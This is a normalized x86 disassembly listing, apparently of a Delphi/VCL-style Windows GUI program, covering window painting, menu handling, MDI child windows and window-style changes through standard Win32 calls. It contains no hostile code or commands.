mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4469b0
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41ecfc
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41ecd0
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403368
test al al
jne r-xdata
sub_4597c0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4030b4
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4597ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebp
call sub_4430fc
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41ecfc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4469f8
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41ecd0
mov si 0xfff1
call sub_403368
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41ed0c
jmp r-xdata
sub_459880
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43fd98
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_440d98
sub_4598a8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43f5cc
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4598d8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43f610
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_459908
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43fad0
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45aa40
pop esi
pop ebx
retn
sub_45994c
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4599a5
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599ac
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_4599b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43fa84
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_443924
mov eax ebx
call sub_443ac0
sub_4599ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41eb48
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_459a2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443de0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403368
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403368
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_440d98
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_453114
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a358
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459ca5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459c88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_422a70
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4228ec
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4545fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459c8f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_422a70
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_453114
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a358
call sub_446450
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_459dd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459dac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459d8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_422a70
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4228ec
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d96
xor edx edx
mov eax [ ebp - 0xc ]
call sub_422a70
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_446450
mov esi eax
sub_459db3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ReleaseDC
retn
sub_459e64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_459eb0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45a38c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45a3d8
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_459ef0
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45a0be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_42222c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_444080
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43f6f4
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e4ec
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_459e64
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_42222c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_45a38c
test eax eax
je r-xdata
push ebp
call sub_459e64
pop ecx
push ebp
call sub_459e64
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_459eb0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_4570d8
jmp r-xdata
sub_45a0d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4582a0
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_45a13c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_45893c
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax ebx
call sub_41ecfc
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4431f0
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41ecd0
call sub_453c58
mov edx esi
mov eax ebx
call sub_41ecd0
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
sub_45a1d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_45a251
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_45a25c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44396c
sub_45a288
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44396c
xor edx edx
jmp r-xdata
mov eax esi
call sub_45841c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45a2c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43f3b4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44396c
sub_45a304
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43f4c0
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_45a358
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43ca3c
sub_45a38c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45defc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45dee8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45a3d8
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45defc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45dee8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a428
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_417d38
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_45a458
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_446450
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45decc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45decc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_45a428
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45decc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45deb8
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_417e94
call sub_40316c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45deb8
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45deb8
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45deb8
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45a55c
push ebx
mov ebx eax
mov eax ebx
call sub_45a554
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_428318
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45a584
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_443924
mov dl 0x1
mov eax esi
call sub_45a8e8
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_45a964
mov edx eax
mov eax esi
call sub_43fd50
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_443ac0
mov dl 0x1
mov eax esi
call sub_459908
sub_45a604
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_446450
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_450254
mov edi eax
mov eax ebp
call sub_446450
push eax
call DrawMenuBar
sub_45a680
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41e7a8
xor edx edx
mov eax ebx
call sub_451bec
sub_45a6a4
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45a604
mov eax edx
mov edx ebx
call sub_41e7a8
sub_45a6cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a892
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45defc
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4537a0
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45dee8
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41e7a8
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45dee8
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
mov eax ebx
call sub_446754
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_446450
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45a604
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a899
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov dl 0x1
mov eax ebx
call sub_45b790
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_446450
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_446450
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_446450
mov edx eax
mov eax esi
call sub_4537a0
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_446450
push eax
call SetMenu
sub_45a8b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a8a0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45a910
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45a904
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45a97c
push ebx
mov ebx eax
mov eax ebx
call sub_445a68
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
